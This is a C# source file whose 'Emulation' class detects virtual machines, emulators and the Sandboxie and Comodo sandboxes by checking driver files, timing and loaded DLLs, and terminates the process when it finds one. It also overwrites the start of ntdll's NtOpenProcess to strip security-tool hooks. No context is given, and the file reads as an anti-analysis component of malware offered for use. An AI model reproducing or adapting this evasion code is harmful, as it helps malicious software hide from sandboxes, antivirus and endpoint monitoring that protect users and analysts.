using helpers;
using System;
using System.Diagnostics;
using System.IO;
using System.Threading;

namespace checks {
    class Emulation {
        public static void Init( ) {
            if ( EmulationTickCount( ) || CheckSimpleSandbox( ) || ComodoSandBox( ) || VmDrivers( ) ) {
                Environment.FailFast( "" );
            }
        }
        public static bool VmDrivers( ) {
            string [ ] BadDriverScan = { "balloon.sys" , "netkvm.sys" , "vioinput" , "viofs.sys" , "vioser.sys" };
            string [ ] DriverDir = Directory.GetFiles( Environment.GetFolderPath( Environment.SpecialFolder.Windows ) + @"\System32" , "*" );
            foreach ( string Drivers in DriverDir ) {
                foreach ( string BadDrivers in BadDriverScan ) {
                    if ( Drivers.Contains( BadDrivers ) ) {
                        return true;
                    }
                }
            }
            return false;
        }
        public static bool EmulationTickCount( ) {
            long tickCount = Environment.TickCount;
            Thread.Sleep( 1000 );
            long tickCount2 = Environment.TickCount;

            if ( ( tickCount2 - tickCount ) < 500L )
                return true;
            return false;
        }

        public static bool CheckSimpleSandbox( ) {
            if ( WinAPI.GetModuleHandle( "SbieDll.dll" ) != IntPtr.Zero )
                return true;
            return false;
        }

        public static bool ComodoSandBox( ) {
            if ( WinAPI.GetModuleHandle( "cmdvrt32.dll" ) != IntPtr.Zero || WinAPI.GetModuleHandle( "cmdvrt64.dll" ) != IntPtr.Zero )
                return true;
            return false;
        }

        public static void SandBoxCrash( ) {
            byte [ ] UnHookedCode = { 0xB8 , 0x26 , 0x00 , 0x00 , 0x00 };
            IntPtr NtdllModule = WinAPI.GetModuleHandle( "ntdll.dll" );
            IntPtr NtOpenProcess = WinAPI.GetProcAddress( NtdllModule , "NtOpenProcess" );
            WinAPI.WriteProcessMemory( Process.GetCurrentProcess( ).Handle , NtOpenProcess , UnHookedCode , 5 , 0 );
            Process [ ] GetProcesses = Process.GetProcesses( );
            foreach ( Process ProcessesHandle in GetProcesses ) {
                bool DoingSomethingWithHandle = false;
                try {
                    WinAPI.IsProcessCritical( ProcessesHandle.Handle , ref DoingSomethingWithHandle );
                } catch {
                    continue;
                }
            }
        }
    }
}
